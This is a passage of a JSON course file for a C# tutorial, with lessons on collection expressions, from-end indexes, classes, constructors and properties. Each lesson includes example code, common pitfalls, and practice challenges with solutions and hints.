              "content": "## Watch Out For These!\n\n**var doesn't work directly**: Collection expressions require an explicit target type. `var x = [1, 2, 3];` won't compile! Always specify the type: `int[] x = [1, 2, 3];` or `List<int> x = [1, 2, 3];`\n\n**Don't confuse [ ] with { }**: Collection expressions use SQUARE brackets [ ]. The old initializer syntax uses curly braces { }. They're different! [1, 2, 3] is C# 12+, {1, 2, 3} is older syntax.\n\n**Spread element requires two dots**: To spread a collection, use two dots: [..array]. A single dot or no dots treats it as a single element, not a spread.\n\n**Performance consideration**: Collection expressions are highly optimized, especially for immutable collections like ImmutableArray<T>. They often generate better code than traditional initializers!\n\n**Requires .NET 8+**: Collection expressions are a C# 12 feature, which requires .NET 8 or later. Older projects need to upgrade to use this syntax."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-05-05-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a playlist manager using collection expressions!\n\n1. Create a string[] 'rockSongs' with 3 rock songs using [ ]\n2. Create a string[] 'popSongs' with 3 pop songs using [ ]\n3. Create a combined 'allSongs' using spread operator to merge both\n4. Add 'Bonus Track' at the end of allSongs\n5. Create an empty List<string> 'favorites' using [ ]\n6. Display all songs using foreach",
              "starterCode": "// Create rock songs array\n\n// Create pop songs array\n\n// Combine all songs with spread and add bonus\n\n// Create empty favorites list\n\n// Display all songs",
              "solution": "// Create rock songs array\nstring[] rockSongs = [\"Bohemian Rhapsody\", \"Stairway to Heaven\", \"Back in Black\"];\n\n// Create pop songs array\nstring[] popSongs = [\"Billie Jean\", \"Like a Prayer\", \"Shake It Off\"];\n\n// Combine all songs with spread and add bonus\nstring[] allSongs = [..rockSongs, ..popSongs, \"Bonus Track\"];\n\n// Create empty favorites list\nList<string> favorites = [];\n\n// Display all songs\nConsole.WriteLine(\"All Songs:\");\nforeach (string song in allSongs)\n{\n    Console.WriteLine(\"  - \" + song);\n}\n\nConsole.WriteLine($\"Total: {allSongs.Length} songs\");\nConsole.WriteLine($\"Favorites: {favorites.Count} songs\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain 'All Songs'",
                  "expectedOutput": "All Songs",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain 'Bonus Track'",
                  "expectedOutput": "Bonus Track",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain 'Total'",
                  "expectedOutput": "Total",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use square brackets for collections: string[] songs = [\"Song1\", \"Song2\"]. Use .. for spreading: [..array1, ..array2]."
                },
                {
                  "level": 2,
                  "text": "Empty collections use []: List<string> empty = []. The type is determined by what you assign to!"
                },
                {
                  "level": 3,
                  "text": "You can mix spread and values: [..existing, \"New Item\"] adds to the end of the spread collection."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Using { } instead of [ ]",
                  "consequence": "Collection expressions use SQUARE brackets [ ], not curly braces { }. This is a new syntax in C# 12!",
                  "correction": "int[] nums = [1, 2, 3]; NOT int[] nums = {1, 2, 3};"
                },
                {
                  "mistake": "Forgetting .. in spread operator",
                  "consequence": "To spread a collection, you need two dots: [..array]. Single dot or no dot treats it as a single element.",
                  "correction": "[..first, ..second] to combine collections"
                },
                {
                  "mistake": "Using spread without target type",
                  "consequence": "Collection expressions need a target type. 'var x = [1,2,3]' may not compile - use explicit type like 'int[] x = [1,2,3]'.",
                  "correction": "Always specify the collection type or use in context where type is clear."
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "lesson-05-06",
          "title": "Implicit Index Access (C# 13)",
          "moduleId": "module-05",
          "order": 6,
          "estimatedMinutes": 12,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine numbering seats in a theater from both ends. Seat 1 from the front is easy, but what about 'the last seat' or 'second from the end'? Instead of counting all seats first, you'd love to just say 'last seat' or 'seat -2 from end'!\n\nC# 8 introduced the 'from end' operator: ^1 means 'last item', ^2 means 'second to last', etc. But there was a limitation - you couldn't use this in object initializers!\n\nC# 13 fixes this! Now you can use ^index directly when initializing collections in object initializers. This is perfect for:\n- Setting values at the END of arrays without knowing the exact size\n- Initializing collections in reverse order\n- Creating patterns that work from both ends\n\nThink of it as finally being able to say 'fill in the last 3 seats' while setting up a seating chart!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the C# 13 implicit index access using the ^ operator in object initializers.",
              "code": "// C# 13: Implicit 'from end' index (^) in object initializers\n\n// The ^ operator counts from the end:\n// ^1 = last element, ^2 = second-to-last, etc.\n\n// Example: Creating a countdown timer display\npublic class TimerDisplay\n{\n    public int[] Digits { get; set; } = new int[10];\n}\n\n// Before C# 13: You couldn't use ^ in object initializers!\n// Now you CAN use the 'from end' index operator:\nvar countdown = new TimerDisplay\n{\n    Digits =\n    {\n        [^1] = 0,   // Last position = 0\n        [^2] = 1,   // Second-to-last = 1\n        [^3] = 2,   // Third-to-last = 2\n        [^4] = 3,\n        [^5] = 4,\n        [^6] = 5,\n        [^7] = 6,\n        [^8] = 7,\n        [^9] = 8,\n        [^10] = 9   // First position = 9\n    }\n};\n\n// The array now contains: [9, 8, 7, 6, 5, 4, 3, 2, 1, 0]\nConsole.WriteLine(\"Countdown: \" + string.Join(\", \", countdown.Digits));\n\n// Another example: Buffer with values at both ends\npublic class Buffer\n{\n    public byte[] Data { get; } = new byte[256];\n}\n\nvar buffer = new Buffer\n{\n    Data =\n    {\n        [0] = 0xAA,    // First byte (header)\n        [1] = 0xBB,    // Second byte\n        [^1] = 0xFF,   // Last byte (footer)\n        [^2] = 0xFE    // Second-to-last\n    }\n};\n\nConsole.WriteLine($\"First: 0x{buffer.Data[0]:X2}\");   // 0xAA\nConsole.WriteLine($\"Last: 0x{buffer.Data[^1]:X2}\");   // 0xFF\n\n// The ^ operator works with the Index type\nIndex lastIndex = ^1;\nConsole.WriteLine($\"Using Index: {buffer.Data[lastIndex]:X2}\");",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`^n` (from-end operator)**: The caret ^ creates an index counting from the end. ^1 is the last element, ^2 is second-to-last, etc. It's equivalent to `array[array.Length - n]`.\n\n**`[^1] = value` in initializers**: C# 13 allows using ^ indexes inside object initializers. Previously, this caused a compiler error - now it works!\n\n**Requires Length property**: The ^ operator needs to know the collection's length. The type must have a Length or Count property for this to work.\n\n**Index type**: ^n actually creates an `Index` struct. You can store it in a variable: `Index last = ^1;` and use it later: `array[last]`.\n\n**Mixing forward and backward**: You can combine regular indexes [0], [1] with from-end indexes [^1], [^2] in the same initializer - great for setting headers and footers!"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These!\n\n**^0 is out of bounds**: Unlike regular indexing, ^0 means 'one past the end' - it will throw IndexOutOfRangeException! Use ^1 for the last element.\n\n**Requires .NET 9 / C# 13**: This feature requires the C# 13 compiler, which comes with .NET 9 SDK. Older projects won't support this syntax in object initializers.\n\n**Collection must have Length property**: The ^ operator requires a Length or Count property to calculate the actual index. Custom collections need to implement this.\n\n**Not all collections support it**: While arrays and List<T> work great, some custom collections might not support index initialization. Check documentation!\n\n**Readability trade-off**: While ^1, ^2 is convenient, using too many from-end indexes can make code harder to follow. Use comments when the intent isn't obvious."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-05-06-challenge-01",
              "title": "Practice Challenge",
              "description": "Practice using the C# 13 implicit 'from end' index (^) in object initializers.",
              "instructions": "Create a countdown display using the ^ operator in object initializers!\n\n1. Create a class called 'Countdown' with a public int[] Numbers property initialized to size 5\n2. Create an instance using object initializer with ^ operator:\n   - Set [^1] = 1 (last position)\n   - Set [^2] = 2 (second-to-last)\n   - Set [^3] = 3 (third-to-last)\n   - Set [^4] = 4\n   - Set [^5] = 5 (first position)\n3. Display all numbers using a foreach loop\n4. Also display using ^1 index: 'Last number is: X'\n\nThe result should show: 5, 4, 3, 2, 1",
              "starterCode": "// Define the Countdown class\npublic class Countdown\n{\n    public int[] Numbers { get; set; } = new int[5];\n}\n\n// Create instance using ^ operator in initializer\n\n// Display all numbers\n\n// Display last number using ^1",
              "solution": "// Define the Countdown class\npublic class Countdown\n{\n    public int[] Numbers { get; set; } = new int[5];\n}\n\n// Create instance using ^ operator in initializer\nvar timer = new Countdown\n{\n    Numbers =\n    {\n        [^5] = 5,  // First position\n        [^4] = 4,\n        [^3] = 3,\n        [^2] = 2,\n        [^1] = 1   // Last position\n    }\n};\n\n// Display all numbers\nConsole.WriteLine(\"Countdown sequence:\");\nforeach (int num in timer.Numbers)\n{\n    Console.Write(num + \" \");\n}\nConsole.WriteLine();\n\n// Display last number using ^1\nConsole.WriteLine($\"Last number is: {timer.Numbers[^1]}\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain 'Countdown'",
                  "expectedOutput": "Countdown",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain 'Last number'",
                  "expectedOutput": "Last number",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should show the sequence with 5",
                  "expectedOutput": "5",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "The ^ operator counts from the end. ^1 is the last element, ^2 is second-to-last, etc."
                },
                {
                  "level": 2,
                  "text": "In object initializers, use the syntax: Numbers = { [^1] = value, [^2] = value }. Note the curly braces after the property name!"
                },
                {
                  "level": 3,
                  "text": "Remember: ^0 is OUT OF BOUNDS! It means 'one past the end'. The last valid element is ^1."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Using ^0 for the last element",
                  "consequence": "^0 means 'one past the end' and throws IndexOutOfRangeException! The last element is ^1, not ^0.",
                  "correction": "Use ^1 for last, ^2 for second-to-last, etc."
                },
                {
                  "mistake": "Forgetting the caret ^ symbol",
                  "consequence": "[1] is the SECOND element (index 1 from start), while [^1] is the LAST element. Without ^, you're indexing from the front!",
                  "correction": "Always include ^ when indexing from the end: [^1], [^2], etc."
                },
                {
                  "mistake": "Using ^ outside object initializers in older C# versions",
                  "consequence": "The ^ operator has been available since C# 8, but using it in OBJECT INITIALIZERS is new in C# 13. Make sure your project targets .NET 9.",
                  "correction": "Ensure your project uses C# 13 / .NET 9 for object initializer support"
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        }
      ]
    },
    {
      "id": "module-06",
      "title": "Methods and Functions",
      "description": "Create reusable code with methods, parameters, return values, method overloading, and scope.",
      "difficulty": "beginner",
      "estimatedHours": 2,
      "lessons": [
        {
          "id": "lesson-06-01",
          "title": "Why Object-Oriented Programming?",
          "moduleId": "module-06",
          "order": 1,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine building 100 houses. Would you redesign each house from scratch? NO! You'd create a BLUEPRINT and build all houses from that blueprint!\n\nThat's Object-Oriented Programming (OOP)! Instead of writing scattered variables and functions, you create BLUEPRINTS (called CLASSES) that define how things work. Then you build actual OBJECTS from those blueprints.\n\nWithout OOP:\nstring player1Name = 'Alice';\nint player1Score = 100;\nint player1Health = 80;\nstring player2Name = 'Bob';\nint player2Score = 150;\nint player2Health = 60;\n...(100 players = 300 variables!)\n\nWith OOP:\nCreate a Player blueprint once.\nPlayer alice = new Player('Alice', 100, 80);\nPlayer bob = new Player('Bob', 150, 60);\n\nOOP makes code ORGANIZED, REUSABLE, and SCALABLE. It's how professional software is built!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// WITHOUT OOP - messy!\nstring playerName = \"Alice\";\nint playerScore = 100;\nint playerHealth = 80;\n\nvoid DisplayPlayer()\n{\n    Console.WriteLine(playerName + \": \" + playerScore + \" points, \" + playerHealth + \" HP\");\n}\n\n// WITH OOP - clean and organized!\nclass Player\n{\n    public string Name;\n    public int Score;\n    public int Health;\n    \n    public void Display()\n    {\n        Console.WriteLine(Name + \": \" + Score + \" points, \" + Health + \" HP\");\n    }\n}\n\n// Creating objects from the class\nPlayer alice = new Player();\nalice.Name = \"Alice\";\nalice.Score = 100;\nalice.Health = 80;\nalice.Display();\n\nPlayer bob = new Player();\nbob.Name = \"Bob\";\nbob.Score = 150;\nbob.Health = 60;\nbob.Display();",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`class ClassName`**: Defines a blueprint. By convention, class names use PascalCase (first letter capitalized). This is the template!\n\n**`public string Name;`**: A FIELD - data stored in the class. 'public' means accessible from outside. Each object gets its OWN copy of this data!\n\n**`new Player()`**: Creates an OBJECT (instance) from the class blueprint. 'new' allocates memory and builds the object. This is called INSTANTIATION.\n\n**`object.Field`**: Dot notation accesses an object's data or methods. alice.Name gets Alice's name, bob.Name gets Bob's - they're separate!"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "**Forgetting 'new':** `Player p = Player();` is WRONG! You must use `new Player()` to create an instance. Without 'new', C# thinks you're calling a method.\n\n**Class vs Object confusion:** The class is the BLUEPRINT (definition). Objects are INSTANCES built from the blueprint. You can have many Player objects, but only one Player class.\n\n**Public fields are risky!** While we use `public string Name;` here for simplicity, real code uses properties with get/set for data protection. You'll learn this soon!\n\n**Null reference errors:** If you declare `Player p;` without `= new Player()`, then `p.Name` will crash! Always initialize your objects."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-06-01-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create your first class!\n\n1. Create a class called 'Car' with public fields:\n   - string Brand\n   - string Model\n   - int Year\n2. Create two Car objects:\n   - One for a Toyota Camry from 2020\n   - One for a Honda Civic from 2019\n3. Display both cars in format: '[Brand] [Model] ([Year])'\n\nThis is your first step into OOP!",
              "starterCode": "// Create your Car class here\n\n// Create two Car objects and display them",
              "solution": "// Create your Car class here\nclass Car\n{\n    public string Brand;\n    public string Model;\n    public int Year;\n}\n\n// Create two Car objects and display them\nCar car1 = new Car();\ncar1.Brand = \"Toyota\";\ncar1.Model = \"Camry\";\ncar1.Year = 2020;\n\nCar car2 = new Car();\ncar2.Brand = \"Honda\";\ncar2.Model = \"Civic\";\ncar2.Year = 2019;\n\nConsole.WriteLine(car1.Brand + \" \" + car1.Model + \" (\" + car1.Year + \")\");\nConsole.WriteLine(car2.Brand + \" \" + car2.Model + \" (\" + car2.Year + \")\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Toyota\"",
                  "expectedOutput": "Toyota",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Honda\"",
                  "expectedOutput": "Honda",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Define class: class Car { public string Brand; ... }. Create object: Car c = new Car(); Set fields: c.Brand = 'Toyota';"
                },
                {
                  "level": 2,
                  "text": "Forgetting 'new' keyword: Car c = Car(); is WRONG! Must be: Car c = new Car(); to create an object."
                },
                {
                  "level": 3,
                  "text": "Class vs Object confusion: The class is the BLUEPRINT. Objects are INSTANCES built from the blueprint. You can have many objects from one class!"
                },
                {
                  "level": 4,
                  "text": "Forgetting 'public': If you don't write 'public', fields are private by default and can't be accessed outside the class!"
                },
                {
                  "level": 5,
                  "text": "Capitalization: Class names should be PascalCase (Player, Car, not player, car). This is convention, not a requirement, but follow it!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting 'new' keyword",
                  "consequence": "Car c = Car(); is WRONG! Must be: Car c = new Car(); to create an object.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Class vs Object confusion",
                  "consequence": "The class is the BLUEPRINT. Objects are INSTANCES built from the blueprint. You can have many objects from one class!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting 'public'",
                  "consequence": "If you don't write 'public', fields are private by default and can't be accessed outside the class!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Capitalization",
                  "consequence": "Class names should be PascalCase (Player, Car, not player, car). This is convention, not a requirement, but follow it!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-06-02",
          "title": "Constructors (The Setup Crew)",
          "moduleId": "module-06",
          "order": 2,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "When you build a house, there's a crew that sets everything up FIRST - they install the foundation, connect the water, turn on the electricity. Only THEN is the house ready to use!\n\nA CONSTRUCTOR is that setup crew for your objects! It's a special method that runs automatically when you create an object with 'new'. It initializes the object with starting values.\n\nWithout constructor (tedious):\nPlayer p = new Player();\np.Name = 'Alice';\np.Score = 0;\np.Health = 100;\n\nWith constructor (one line!):\nPlayer p = new Player('Alice', 0, 100);\n\nConstructors make object creation EASIER and SAFER - you can't forget to set important values!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// Traditional constructor\nclass Player\n{\n    public string Name;\n    public int Score;\n    public int Health;\n    \n    // Constructor - same name as class, no return type!\n    public Player(string name, int score, int health)\n    {\n        Name = name;\n        Score = score;\n        Health = health;\n        Console.WriteLine(\"Player created: \" + Name);\n    }\n    \n    public void Display()\n    {\n        Console.WriteLine(Name + \": \" + Score + \" points, \" + Health + \" HP\");\n    }\n}\n\n// C# 12 Primary Constructor - parameters in class declaration!\nclass Enemy(string name, int damage)\n{\n    public string Name { get; } = name;\n    public int Damage { get; } = damage;\n    \n    public void Attack() => Console.WriteLine($\"{Name} attacks for {Damage} damage!\");\n}\n\n// Creating objects\nPlayer alice = new Player(\"Alice\", 100, 80);\nalice.Display();\n\nEnemy goblin = new Enemy(\"Goblin\", 15);\ngoblin.Attack();",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`public Player(...)`**: Constructor has the SAME NAME as the class and NO RETURN TYPE (not even void!). This is how C# knows it's a constructor.\n\n**`Parameters`**: Constructors can take parameters to initialize the object. When you write 'new Player(\"Alice\", 100)', you're calling the constructor with those values!\n\n**`Name = name;`**: Inside the constructor, set the class fields using the parameters. 'Name' (field) = 'name' (parameter). Common pattern!\n\n**`Auto-runs on 'new'`**: You don't 'call' the constructor explicitly. It runs automatically when you use 'new Player(...)'. It's the first code that executes!\n\n**`Primary Constructors (C# 12+)`**: Write parameters directly after the class name: `class Enemy(string name, int damage)`. These parameters are available throughout the class body. Much more concise for simple classes!"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "**Don't add a return type!** Writing `public void Player()` makes it a regular method named 'Player', NOT a constructor! Constructors have NO return type.\n\n**Primary constructor parameters aren't properties!** In `class Person(string name)`, 'name' is just a parameter, not a public property. You must explicitly create properties: `public string Name { get; } = name;`\n\n**Forgetting 'new':** Writing `Player p = Player(\"Alice\")` is wrong! Must use `new Player(\"Alice\")` to instantiate.\n\n**Constructor chaining:** If you have multiple constructors, use `this()` to call another constructor from the same class, avoiding code duplication."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-06-02-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Enhance your Car class with a constructor!\n\n1. Create a Car class with fields: Brand, Model, Year\n2. Add a constructor that takes all three values as parameters\n3. In the constructor, set the fields AND print 'Car created: [Brand] [Model]'\n4. Create two Car objects using the constructor in ONE line each\n5. Display both cars\n\nMuch cleaner than setting fields one by one!",
              "starterCode": "// Car class with constructor\nclass Car\n{\n    public string Brand;\n    public string Model;\n    public int Year;\n    \n    // Add constructor here\n}\n\n// Create cars using constructor\n\n// Display cars",
              "solution": "// Car class with constructor\nclass Car\n{\n    public string Brand;\n    public string Model;\n    public int Year;\n    \n    // Constructor\n    public Car(string brand, string model, int year)\n    {\n        Brand = brand;\n        Model = model;\n        Year = year;\n        Console.WriteLine(\"Car created: \" + Brand + \" \" + Model);\n    }\n}\n\n// Create cars using constructor\nCar car1 = new Car(\"Toyota\", \"Camry\", 2020);\nCar car2 = new Car(\"Honda\", \"Civic\", 2019);\n\n// Display cars\nConsole.WriteLine(car1.Brand + \" \" + car1.Model + \" (\" + car1.Year + \")\");\nConsole.WriteLine(car2.Brand + \" \" + car2.Model + \" (\" + car2.Year + \")\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Car created\"",
                  "expectedOutput": "Car created",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Toyota\"",
                  "expectedOutput": "Toyota",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Constructor: public ClassName(parameters) { set fields }. Same name as class, no return type! Call with: new ClassName(arguments);"
                },
                {
                  "level": 2,
                  "text": "Adding return type: public void Car(...) is WRONG! Constructors have NO return type, not even void! Just: public Car(...)"
                },
                {
                  "level": 3,
                  "text": "Wrong name: The constructor MUST have the exact same name as the class! public Player(...) for class Player."
                },
                {
                  "level": 4,
                  "text": "Forgetting 'new': You still need 'new' when using a constructor! Player p = Player('Alice') is wrong - must be new Player('Alice')."
                },
                {
                  "level": 5,
                  "text": "Parameter naming: Common to use lowercase parameter names (string name) and assign to PascalCase fields (Name = name). Don't confuse them!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Adding return type",
                  "consequence": "public void Car(...) is WRONG! Constructors have NO return type, not even void! Just: public Car(...)",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Wrong name",
                  "consequence": "The constructor MUST have the exact same name as the class! public Player(...) for class Player.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting 'new'",
                  "consequence": "You still need 'new' when using a constructor! Player p = Player('Alice') is wrong - must be new Player('Alice').",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Parameter naming",
                  "consequence": "Common to use lowercase parameter names (string name) and assign to PascalCase fields (Name = name). Don't confuse them!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-06-03",
          "title": "Properties (Controlled Access to Data)",
          "moduleId": "module-06",
          "order": 3,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine a bank vault. You can't just walk in and grab money - you need to go through a teller who validates your request, checks your balance, and controls access!\n\nPROPERTIES are like that teller. Instead of exposing fields directly (public string Name;), you use properties with get and set to control HOW data is accessed and modified.\n\nWhy? VALIDATION and SECURITY!\n• Check if age is valid (0-120) before storing\n• Make data read-only (get only, no set)\n• Calculate values on the fly (FullName = FirstName + LastName)\n\nProperties look like fields when you use them, but they're actually methods in disguise! This is called ENCAPSULATION - hiding implementation details and controlling access."
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "class Person\n{\n    private int _age;  // Private field (backing field)\n\n    // Property with validation\n    public int Age\n    {\n        get { return _age; }\n        set\n        {\n            if (value >= 0 && value <= 120)\n                _age = value;\n            else\n                Console.WriteLine(\"Invalid age!\");\n        }\n    }\n\n    // Auto-implemented property (no backing field needed)\n    public string Name { get; set; }\n\n    // Init-only property (C# 9+) - can only be set during construction\n    public string Id { get; init; }\n\n    // Required property (C# 11+) - MUST be set when creating object\n    public required string Email { get; set; }\n\n    // Read-only property (get only)\n    public string Status => Age >= 18 ? \"Adult\" : \"Minor\";\n\n    // Expression-bodied property (C# 6+)\n    public string Category => Age >= 65 ? \"Senior\" : \"Regular\";\n}\n\n// Usage\nPerson person = new Person\n{\n    Name = \"Alice\",\n    Email = \"alice@example.com\",  // Required - must provide!\n    Id = \"P001\"                    // Init-only - set once here\n};\nperson.Age = 25;          // Works fine\nperson.Name = \"Alicia\";   // Can change later\n// person.Id = \"P002\";    // ERROR! Init-only can't be changed after creation\nConsole.WriteLine($\"{person.Name}: {person.Status}\");",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`get { return _age; }`**: The 'get' accessor returns the value. Called when you READ the property (Console.WriteLine(person.Age)).\n\n**`set { _age = value; }`**: The 'set' accessor assigns the value. 'value' is a special keyword containing what the user is trying to assign. Add validation here!\n\n**`public string Name { get; set; }`**: AUTO-IMPLEMENTED property. C# creates a hidden backing field for you. Use when you don't need validation.\n\n**`{ get; init; }`** (C# 9+): INIT-ONLY property. Can be set during object initialization but becomes read-only afterwards. Perfect for immutable data that should never change after creation!\n\n**`required`** (C# 11+): Forces callers to initialize the property when creating an object. The compiler won't let you forget! Combine with init for required immutable properties.\n\n**`=> expression`**: Expression-bodied property (C# 6+). Shorthand for get-only properties. 'public string FullName => First + \" \" + Last;' returns calculated value."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "**The 'required' keyword only works at compile time!** If you create objects using reflection or JSON deserialization, 'required' won't throw errors - it's purely a compile-time check.\n\n**Don't confuse 'init' with 'private set':** Both restrict modification, but 'init' allows setting during object initialization (even from outside), while 'private set' only allows the class itself to modify the value.\n\n**Auto-properties can't have validation!** If you write `{ get; set; }`, there's no place to add validation logic. You need the full property syntax with a backing field to add checks.\n\n**Infinite recursion trap:** Never do `public int Age { get { return Age; } }` - this calls itself forever! Use a backing field: `get { return _age; }`"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-06-03-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a BankAccount class with controlled properties!\n\n1. Private field: decimal _balance (starts at 0)\n2. Property 'Balance' with:\n   - get: returns _balance\n   - set: only allows positive values, otherwise print error\n3. Auto-property: string AccountHolder { get; set; }\n4. Read-only property: bool IsOverdrawn (returns true if balance < 0)\n5. Create an account, try to set negative balance, display status",
              "starterCode": "class BankAccount\n{\n    private decimal _balance = 0;\n    \n    // Add Balance property with validation\n    \n    // Add AccountHolder auto-property\n    \n    // Add IsOverdrawn read-only property\n}\n\n// Create account and test\nBankAccount account = new BankAccount();\naccount.AccountHolder = \"Alice\";\n// Try setting balance to 100, then try -50\n// Display balance and IsOverdrawn status",
              "solution": "class BankAccount\n{\n    private decimal _balance = 0;\n    \n    public decimal Balance\n    {\n        get { return _balance; }\n        set\n        {\n            if (value >= 0)\n                _balance = value;\n            else\n                Console.WriteLine(\"Balance cannot be negative!\");\n        }\n    }\n    \n    public string AccountHolder { get; set; }\n    \n    public bool IsOverdrawn => _balance < 0;\n}\n\nBankAccount account = new BankAccount();\naccount.AccountHolder = \"Alice\";\naccount.Balance = 100;\nConsole.WriteLine(\"Balance: $\" + account.Balance);\n\naccount.Balance = -50;  // Rejected!\nConsole.WriteLine(\"Balance: $\" + account.Balance);\nConsole.WriteLine(\"Overdrawn: \" + account.IsOverdrawn);",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Balance\"",
                  "expectedOutput": "Balance",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Alice\"",
                  "expectedOutput": "Alice",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Property structure: public Type PropertyName { get { return field; } set { if (valid) field = value; } }. Use => for read-only calculated properties."
                },
                {
                  "level": 2,
                  "text": "Forgetting private backing field: If you use get/set with logic, you need a private field like _age to store the actual value!"
                },
                {
                  "level": 3,
                  "text": "Naming confusion: Convention is _camelCase for private fields, PascalCase for properties. _age (field) and Age (property)."
                },
                {
                  "level": 4,
                  "text": "Auto-property when you need validation: { get; set; } doesn't let you add validation! Use full get/set syntax when you need to check values."
                },
                {
                  "level": 5,
                  "text": "Using 'this.value' in set: The parameter is just 'value', not 'this.value'. It's a special keyword in the set accessor."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting private backing field",
                  "consequence": "If you use get/set with logic, you need a private field like _age to store the actual value!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Naming confusion",
                  "consequence": "Convention is _camelCase for private fields, PascalCase for properties. _age (field) and Age (property).",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Auto-property when you need validation",
                  "consequence": "{ get; set; } doesn't let you add validation! Use full get/set syntax when you need to check values.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Using 'this.value' in set",
                  "consequence": "The parameter is just 'value', not 'this.value'. It's a special keyword in the set accessor.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-06-04",
          "title": "Methods (What Your Objects Can Do)",
          "moduleId": "module-06",
          "order": 4,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
